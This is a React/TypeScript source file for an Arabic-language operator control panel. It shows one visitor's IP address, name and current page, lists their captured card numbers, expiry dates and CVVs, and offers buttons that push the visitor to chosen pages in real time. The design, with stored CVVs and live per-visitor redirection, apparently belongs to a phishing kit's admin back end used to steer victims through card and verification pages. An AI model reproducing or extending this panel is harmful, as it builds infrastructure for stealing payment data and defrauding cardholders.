import React, { useState } from 'react';
import { UserData, AVAILABLE_PAGES } from '../../shared/types';
import { AdminAPI } from '../../services/server';
import ToastMessage from './ToastMessage';
import { maskCardNumberKeepFirstSix, maskSensitiveValue } from '../../shared/utils';

interface ControlPanelProps {
  user: UserData;
  adminService: AdminAPI;
  onClose: () => void;
}

const ControlPanel: React.FC<ControlPanelProps> = ({ user, adminService, onClose }) => {
  const [toastState, setToastState] = useState<{ isOpen: boolean; message: string; type: 'success' | 'error' | 'info' }>({
    isOpen: false,
    message: '',
    type: 'info'
  });

  const handleNavigate = (page: string) => {
    adminService.sendCommand(user.ip, page);
    setToastState({ isOpen: true, message: `تم إرسال أمر التوجيه إلى ${page}`, type: 'success' });
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg shadow-2xl w-full max-w-4xl max-h-[90vh] overflow-y-auto flex flex-col md:flex-row rtl:flex-row-reverse">

        {/* Sidebar */}
        <div className="md:w-1/3 bg-gray-50 p-6 border-l border-gray-200">
          <div className="flex justify-between items-start mb-4">
            <h2 className="text-xl font-bold text-gray-800">لوحة التحكم</h2>
            <button onClick={onClose} className="text-gray-500 hover:text-red-500 text-2xl">&times;</button>
          </div>

          <div className="space-y-4">
            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">عنوان IP</span>
              <span className="font-mono font-bold text-brand">{user.ip}</span>
            </div>

            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">الاسم</span>
              <span className="font-semibold">{user.name || 'غير متوفر'}</span>
            </div>

            <div className="p-3 bg-white rounded shadow-sm border border-gray-200">
              <span className="block text-xs text-gray-500">الصفحة الحالية</span>
              <span className="inline-block px-2 py-1 bg-blue-100 text-blue-800 text-xs rounded-full">
                {AVAILABLE_PAGES.find(p => p.id === user.currentPage)?.label || user.currentPage}
              </span>
            </div>

            {user.payments.length > 0 && (
              <div className="p-3 bg-green-50 rounded shadow-sm border border-green-200">
                <span className="block text-xs text-green-700 font-bold mb-2">بيانات الدفع ({user.payments.length})</span>
                {user.payments.map((p, idx) => (
                  <div key={idx} className="text-xs mb-2 pb-2 border-b border-green-100 last:border-0">
                    <div className="font-mono" dir="ltr">{maskCardNumberKeepFirstSix(p.cardNumber)}</div>
                    <div className="flex justify-between mt-1">
                      <span>{p.expirationDate}</span>
                      <span>CVV: {maskSensitiveValue(p.cvv, 3)}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Navigation Controls */}
        <div className="md:w-2/3 p-6">
          <h3 className="text-lg font-bold mb-4 text-gray-700 border-b pb-2">التوجيه المباشر</h3>
          <div className="grid grid-cols-2 gap-4">
            {AVAILABLE_PAGES.map((page) => (
              <button
                key={page.id}
                onClick={() => handleNavigate(page.id)}
                className={`
                  p-4 rounded-lg border transition-all duration-200 flex flex-col items-center justify-center gap-2
                  ${user.currentPage === page.id
                    ? 'bg-blue-600 text-white border-blue-600 shadow-lg scale-105'
                    : 'bg-white border-gray-200 text-gray-600 hover:bg-blue-50 hover:border-blue-300'
                  }
                `}
              >
                <span className={`text-2xl ${user.currentPage === page.id ? 'text-white' : 'text-blue-500'}`}>
                  {page.icon}
                </span>
                <span className="font-semibold">{page.label}</span>
              </button>
            ))}
          </div>
        </div>

      </div>
      <ToastMessage
        isOpen={toastState.isOpen}
        message={toastState.message}
        type={toastState.type}
        onClose={() => setToastState({ isOpen: false, message: '', type: 'info' })}
      />
    </div>
  );
};

export default ControlPanel;